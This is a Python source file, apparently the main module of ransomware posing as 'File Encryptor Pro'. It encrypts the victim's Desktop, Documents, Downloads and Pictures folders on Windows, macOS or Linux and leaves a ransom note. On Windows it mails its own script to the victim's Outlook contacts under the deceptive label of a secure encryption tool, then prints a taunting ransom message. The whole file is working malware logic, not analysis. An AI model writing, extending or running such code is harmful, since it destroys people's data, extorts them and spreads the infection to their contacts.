import os
import sys
import platform
import time
from encryptor import FileEncryptor
from mailer import OutlookMailer

def get_user_directories():
    if platform.system() == "Windows":
        desktop_path = os.path.join(os.environ.get('USERPROFILE'), 'Desktop')
        documents_path = os.path.join(os.environ.get('USERPROFILE'), 'Documents')
        downloads_path = os.path.join(os.environ.get('USERPROFILE'), 'Downloads')
        pictures_path = os.path.join(os.environ.get('USERPROFILE'), 'Pictures')
    elif platform.system() == "Darwin":  # macOS
        desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
        documents_path = os.path.join(os.path.expanduser('~'), 'Documents')
        downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        pictures_path = os.path.join(os.path.expanduser('~'), 'Pictures')
    else:  # Linux
        desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
        documents_path = os.path.join(os.path.expanduser('~'), 'Documents')
        downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        pictures_path = os.path.join(os.path.expanduser('~'), 'Pictures')
    
    return [desktop_path, documents_path, downloads_path, pictures_path]

def main():
    print("Initializing File Encryptor Pro...")
    time.sleep(2)  # Simulate loading
    
    # Create encryptor
    encryptor = FileEncryptor()
    
    # Get user directories
    user_dirs = get_user_directories()
    
    # Encrypt files in user directories
    print("Encrypting files...")
    for directory in user_dirs:
        if os.path.exists(directory):
            encryptor.encrypt_directory(directory)
    
    # Create ransom note on desktop
    desktop_path = user_dirs[0]
    if os.path.exists(desktop_path):
        encryptor.create_ransom_note(desktop_path)
    
    # Save the encryption key (in a real scenario, this would be sent to the attacker)
    key_path = os.path.join(desktop_path, "encryption_key.key")
    with open(key_path, 'wb') as key_file:
        key_file.write(encryptor.key)
    
    # Send virus to contacts via Outlook
    print("Sending secure encryption tool to your contacts...")
    if platform.system() == "Windows":
        try:
            mailer = OutlookMailer()
            # Get the current script path to send as attachment
            script_path = os.path.abspath(__file__)
            mailer.send_virus_to_contacts(script_path)
        except Exception as e:
            print(f"Error sending emails: {e}")
    
    # Display ransom note
    print("\n" + "="*50)
    print("YOUR FILES HAVE BEEN ENCRYPTED!")
    print("="*50)
    print("All your important files have been encrypted.")
    print("This looks like a skill issue on your part.")
    print("Check your desktop for further instructions.")
    print("="*50)
    
    # Keep the program running
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
